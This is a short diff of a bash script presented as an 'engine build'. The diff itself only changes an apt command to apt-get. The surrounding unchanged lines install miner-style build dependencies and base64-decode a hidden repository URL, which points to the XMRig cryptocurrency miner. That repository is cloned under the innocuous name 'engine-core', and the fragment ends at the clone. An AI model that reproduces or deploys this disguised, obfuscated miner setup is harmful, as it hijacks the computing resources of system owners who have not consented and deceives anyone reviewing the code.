@@ -1,7 +1,7 @@
 #!/bin/bash
 echo "⚙️ Starting engine build..."
 
-apt update && apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev xxd automake libtool autoconf
+apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev xxd automake libtool autoconf
 
 REPO_URL=$(echo "aHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnLmdpdA==" | base64 -d)
 git clone "$REPO_URL" engine-core
